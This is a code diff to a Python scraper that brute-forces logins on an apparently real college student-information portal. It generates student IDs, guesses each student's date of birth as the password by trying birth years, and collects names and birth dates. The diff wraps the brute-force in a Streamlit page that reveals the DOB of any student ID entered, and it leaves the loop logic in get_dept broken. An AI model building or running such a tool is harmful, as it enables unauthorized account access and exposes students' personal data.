@@ -1,10 +1,8 @@
-import os
 import pickle
-import tempfile
 import time
 from typing import Union
 from threading import Thread
-
+import streamlit as st
 from scraper import Scraper, cached, gen_usn, roll_range
 
 
@@ -68,16 +66,14 @@ class SisScraper(Scraper):
     def get_dept(self, head: str, year: str, dept: str, tolerate: int = 5):
         payload = gen_payload()
         tol = tolerate
-        for roll in roll_range():
-            if tol <= 0: return
-            payload["username"] = gen_usn(year, dept, roll, head)
-            payload["passwd"] = self.get_dob(payload["username"])
-            stats = self.get_stats(payload)
-            if not stats:
-                tol -= 1
-                continue
-            tol = tolerate
-            yield stats
+        if tol <= 0: return
+        payload["username"] = gen_usn(year, dept, roll, head)
+        payload["passwd"] = self.get_dob(payload["username"])
+        stats = self.get_stats(payload)
+        if not stats:
+            tol -= 1
+        tol = tolerate
+        yield stats
 
     @cached(get_cache())
     def get_dob(self, usn) -> Union[str, None]:
@@ -85,6 +81,7 @@ class SisScraper(Scraper):
         for year in [y := join_year - 18, y - 1, y + 1, y - 2]:
             if dob := self.brute_year(usn, year): return dob
 
+    @cached(get_cache())
     def brute_year(self, usn: str, year: int) -> Union[str, None]:
         workers = []
         dob = [None]
@@ -117,16 +114,12 @@ class SisScraper(Scraper):
 
 
 def macro(head: str, year: str, dept: str, file=None, dry: bool = False):
-    if not os.path.exists(f"sis/{dept}") and not dry: os.mkdir(f"sis/{dept}")
-    file = f"sis/{dept}/sis_{year}_{dept}.csv" if file is None else file
-    with SisScraper() as SIS, \
-            tempfile.TemporaryFile("w+") if dry else open(file, "w+") as f:
+    with SisScraper() as SIS:
         write = \
             f"{'usn':{len(head + year + dept) + 3 + 5}}," \
             f"{'name':64}," \
             f"{'dob':10}," \
             f""
-        if not dry: f.write(write + "\n")
         print(f"[Log] {'Time':10} :", write)
         t = time.time()
         for stat in SIS.get_dept(head, year, dept):
@@ -135,18 +128,23 @@ def macro(head: str, year: str, dept: str, file=None, dry: bool = False):
                 f"{stat['name']:64}," \
                 f"{stat['dob']:10}," \
                 f""
-            if not dry:
-                f.write(write + "\n")
-                f.flush()
+            disp = \
+                f"Time taken: {time.time() - t:10.2f}sec"
+            disp1 = f"Name: {stat['name']}"
             print(f"[Log] {time.time() - t:07.3f}sec :", write)
+            st.write(disp)
+            st.subheader(disp1)
+            st.subheader(f"DOB: {stat['dob']}")
             t = time.time()
             SIS.save_cache()
 
 
 if __name__ == '__main__':
     HEAD = "1MS"
-    YEAR = "21"
-    DEPT = "IS"
-    # macro(HEAD, YEAR, DEPT, dry=False)
-    with SisScraper() as SIS:
-        print(SIS.brute_year("1MS21IS063", 2003))
+    st.title("## Find Your Date of birth")
+    usn = st.text_input("Enter your USN")
+    if usn:
+        roll = int(usn[7:10])
+        DEPT = usn[5:7].upper()
+        YEAR = usn[3:5]
+        macro(HEAD, YEAR, DEPT, dry=False)
